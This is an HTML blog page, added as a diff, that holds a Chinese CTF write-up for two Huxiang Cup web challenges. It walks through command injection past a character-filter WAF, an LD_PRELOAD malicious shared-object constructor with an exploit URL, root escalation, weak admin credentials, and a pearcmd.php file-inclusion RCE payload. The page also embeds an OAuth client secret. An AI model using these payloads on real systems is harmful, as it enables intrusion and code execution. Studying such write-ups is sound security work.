@@ -1,0 +1,314 @@
+<!DOCTYPE html>
+<html>
+  <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta content="yes" name="apple-mobile-web-app-capable" />
+  <meta content="black" name="apple-mobile-web-app-status-bar-style" />
+  <meta name="referrer" content="never">
+  <meta name="keywords" content="">
+  <meta name="description" content="">
+  <meta name="author" content="kveln">
+  <title>湖湘杯线下Writeup |  </title>
+  <link href="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet">
+  <!-- <link href="https://guokeya.github.io/media/css/bootstrap.min.css" rel="stylesheet"> -->
+  <!--  <link href="https://guokeya.github.io/media/css/all.min.css" rel="stylesheet" type="text/css"> -->
+  <link href="https://cdn.bootcss.com/font-awesome/5.11.2/css/all.min.css" rel="stylesheet">
+  <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+  <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
+  <link rel="alternate" type="application/rss+xml" title="湖湘杯线下Writeup |   » Feed" href="https://guokeya.github.io/atom.xml">
+  <link rel="stylesheet"href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.10/build/styles/androidstudio.min.css">
+  <link href="https://guokeya.github.io/styles/main.css" rel="stylesheet">
+  <script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.10/build/highlight.min.js"></script>
+  <!-- <script src="https://guokeya.github.io/media/scripts/jquery.min.js"></script> -->
+  <script>hljs.initHighlightingOnLoad();</script>
+  
+
+    <meta property="og:description" content="湖湘杯线下Writeup"/>
+    <meta property="og:url" content="https://guokeya.github.io/post/ZqfbSBz7J/"/>
+    <meta property="og:locale" content="zh-CN"/>
+    <meta property="og:type" content="website"/>
+    <meta property="og:site_name" content=" "/>
+  </head>
+  <body>
+  	<!-- Navigation -->
+  <nav class="navbar navbar-expand-lg navbar-light fixed-top" id="mainNav">
+    <div class="container">
+      <a class="navbar-brand" href="https://guokeya.github.io"> </a>
+      <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
+        Menu
+        <i class="fas fa-bars"></i>
+      </button>
+      <div class="collapse navbar-collapse" id="navbarResponsive">
+        <ul class="navbar-nav ml-auto">
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/">首页</a>
+              
+          </li>
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/archives">归档</a>
+              
+          </li>
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/post/about">关于</a>
+              
+          </li>
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/tags">分类</a>
+              
+          </li>
+          
+        </ul>
+      </div>
+    </div>
+  </nav>
+  <!-- Page Header -->
+  <header class="masthead" style="background-image: url('https://guokeya.github.io/media/images/home-bg.jpg')">
+    <div class="overlay"></div>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <div class="post-heading">
+          	<span class="tags">
+          	 
+        </span>
+            <h1>湖湘杯线下Writeup</h1>
+            <span class="meta">
+            	Posted on
+              2021-12-06，3 min read
+            </span>
+          </div>
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <!-- Post Content -->
+  <article>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <h1 id="multistageagency">MultistageAgency</h1>
+<p>分析Dockerfile。发现golang是三个服务。</p>
+<pre><code>Proxy   8080
+暴露Web 9090
+后端Web 9091
+</code></pre>
+<p>start.sh</p>
+<pre><code>echo `cat /proc/sys/kernel/random/uuid  | md5sum |cut -c 1-9` &gt; /tmp/secret/key
+su - web -c &quot;/code/bin/web 2&gt;&amp;1  &gt;/code/logs/web.log &amp;&quot;
+su - web -c &quot;/code/bin/proxy 2&gt;&amp;1  &gt;/code/logs/proxy.log &amp;&quot;
+
+/code/bin/server 2&gt;&amp;1  &gt;/code/logs/server.log &amp;
+
+tail -f /code/logs/*
+</code></pre>
+<p>这里proxy和web服务都是web用户起来的。server是root起的。</p>
+<p>看web源码<br>
+<img src="https://guokeya.github.io/post-images/1638761433862.png" alt="" loading="lazy"><br>
+看了下没啥利用点。只有token处会接受get参数遍历添加环境变量<br>
+<img src="https://guokeya.github.io/post-images/1638761493520.png" alt="" loading="lazy"><br>
+前端有个js会自动添加http_proxy=127.0.0.1:8080<br>
+以此通过8080的代理访问到自己的9091端口。获取token<br>
+但是只能访问到web的/<br>
+而token就是对应文件上传和列目录的一个ID。没啥用</p>
+<p>继续看server的源码<br>
+<img src="https://guokeya.github.io/post-images/1638761584934.png" alt="" loading="lazy"><br>
+/就是根据HTTP头。返回对应的token<br>
+/manager<br>
+<img src="https://guokeya.github.io/post-images/1638763570293.png" alt="" loading="lazy"><br>
+m可控。并且直接带入bash -c 'xxxxx'<br>
+能命令注入。但是有waf</p>
+<pre><code>func waf(c string) bool {
+	var t int32
+	t = 0
+	blacklist := []string{&quot;.&quot;, &quot;*&quot;, &quot;?&quot;}
+	for _, s := range c {
+		for _, b := range blacklist {
+			if b == string(s) {
+				return false
+			}
+		}
+		if unicode.IsLetter(s) {
+			if t == s {
+				continue
+			}
+			if t == 0 {
+				t = s
+			} else {
+				return false
+			}
+		}
+	}
+
+	return true
+}
+</code></pre>
+<p>意思就是。不能带.*?和字母<br>
+用<code>https://guokeya.github.io/post/omqnCRpCQ/</code><br>
+生成下exp就行</p>
+<p>接下来就是如何打到9091端口。<br>
+这里通过token接口添加环境变量配合文件上传</p>
+<pre><code>LD_PRELOAD=上传的恶意so
+_evilcmd=uname -a
+</code></pre>
+<p>接着就可以任意代码执行了<br>
+evil.c</p>
+<pre><code>#include&lt;stdlib.h&gt;
+__attribute__((constructor)) void l3yx(){
+    unsetenv(&quot;LD_PRELOAD&quot;);
+    system(getenv(&quot;_evilcmd&quot;));
+}
+</code></pre>
+<p>编译后上传<br>
+路径就是/code/uploads/yourid/随机文件名</p>
+<pre><code>http://xxx:19090/token?LD_PRELOAD=/code/uploads/927a2338b423ff539698ad96f0cf01f0/XVlBz&amp;_evilcmd=ls%20-l%20/&amp;http_proxy=127.0.0.1:8080
+</code></pre>
+<p><img src="https://guokeya.github.io/post-images/1638764500399.png" alt="" loading="lazy"><br>
+然后弹个shell</p>
+<p>接着就是安洵杯。生成下exp<br>
+然后%3b生成的exp。即可拿到root权限<br>
+<img src="https://guokeya.github.io/post-images/1638764611757.png" alt="" loading="lazy"></p>
+<h1 id="josda">josda</h1>
+<p>弱口令admin admin。<br>
+漏洞点位于application/controller/admin/topic.php/verify<br>
+<img src="https://guokeya.github.io/post-images/1638764774544.png" alt="" loading="lazy"><br>
+这里this-&gt;Vars在构造方法中有赋值<br>
+<img src="https://guokeya.github.io/post-images/1638764836013.png" alt="" loading="lazy"><br>
+目前是view方法的第二个参数可控。<br>
+<img src="https://guokeya.github.io/post-images/1638764900312.png" alt="" loading="lazy"><br>
+<code>$this-&gt;_ci_object_to_array</code>会直接返回参数。<br>
+_ci_load方法中的(&quot;_ci_vars&quot;=&gt;可控)<br>
+<img src="https://guokeya.github.io/post-images/1638765043155.png" alt="" loading="lazy"><br>
+变量覆盖点<br>
+<img src="https://guokeya.github.io/post-images/1638765073105.png" alt="" loading="lazy"><br>
+文件包含点<br>
+包含pearcmd.php即可RCE<br>
+payload:<br>
+/admin/topic/verify/?_ci_path=/usr/local/lib/php/pearcmd.php</p>
+
+          
+          <p class="next-post">下一篇：
+            <a href="https://guokeya.github.io/post/YXs3VzrWg/">
+              <span class="post-title">
+                湖湘杯Web&rarr;
+              </span>
+            </a>
+          </p>
+        
+        <div class="comment">
+          
+          
+            <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+<div id="gitalk-container"></div>
+<script>
+  var gitalk = new Gitalk({
+    clientID: 'c07e068ab9501a423854',
+    clientSecret: '33e8ada317c799c9a4ca5cbbb2070ff5a423903b',
+    repo: 'Message',
+    owner: 'guokeya',
+    admin: ['guokeya'],
+    id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+  gitalk.render('gitalk-container')
+</script>
+
+          
+          
+        
+        </div>
+      </div>
+    </div>
+  </article>
+ <!-- Footer -->
+  <footer>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <ul class="list-inline text-center">
+            
+            
+            <li class="list-inline-item">
+              <a href="http://github.com/guokeya" target="_blank">
+                <span class="fa-stack fa-lg">
+                  <i class="fas fa-circle fa-stack-2x"></i>
+                  <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+                </span>
+              </a>
+            </li>
+            
+              
+            
+              
+            
+              
+            
+              
+            
+              
+            
+              
+            
+              
+              <li class="list-inline-item">
+              <a href="https://guokeya.github.io/atom.xml" target="_blank">
+                <span class="fa-stack fa-lg">
+                  <i class="fas fa-circle fa-stack-2x"></i>
+                  <i class="fas fa-rss fa-stack-1x fa-inverse"></i>
+                </span>
+              </a>
+              </li>
+          </ul>
+          <p class="copyright text-muted">Copyright &copy;<span> </span><br><a href="https://github.com/getgridea/gridea" class="Themeinfo">Powered by Gridea<br >浙ICP备2021000950号-1</a></p>
+        </div>
+      </div>
+    </div>
+   </footer>
+  <!-- Bootstrap core JavaScript -->
+  <script src="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/js/bootstrap.bundle.min.js"></script>
+  <!-- <script src="https://guokeya.github.io/media/scripts/bootstrap.bundle.min.js"></script> -->
+  <!-- Bootstrap core JavaScript -->
+  <script src="https://cdn.jsdelivr.net/gh/Alanrk/clean-cdn@1.0/scripts/clean-blog.min.js"></script>
+  <!-- <script src="https://guokeya.github.io/media/scripts/clean-blog.min.js"></script> -->
+  <script src="//instant.page/3.0.0" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
+  <style type="text/css">a.back_to_top{text-decoration:none;position:fixed;bottom:40px;right:30px;background:#f0f0f0;height:40px;width:40px;border-radius:50%;line-height:36px;font-size:18px;text-align:center;transition-duration:.5s;transition-propety:background-color;display:none}a.back_to_top span{color:#888}a.back_to_top:hover{cursor:pointer;background:#dfdfdf}a.back_to_top:hover span{color:#555}@media print,screen and(max-width:580px){.back_to_top{display:none!important}}</style>
+<a id="back_to_top" href="#" class="back_to_top">
+  <span>▲</span></a>
+<script>$(document).ready((function(_this) {
+    return function() {
+      var bt;
+      bt = $('#back_to_top');
+      if ($(document).width() > 480) {
+        $(window).scroll(function() {
+          var st;
+          st = $(window).scrollTop();
+          if (st > 30) {
+            return bt.css('display', 'block')
+          } else {
+            return bt.css('display', 'none')
+          }
+        });
+        return bt.click(function() {
+          $('body,html').animate({
+            scrollTop: 0
+          },
+          800);
+          return false
+        })
+      }
+    }
+  })(this));</script>
+  </body>
+</html>
+
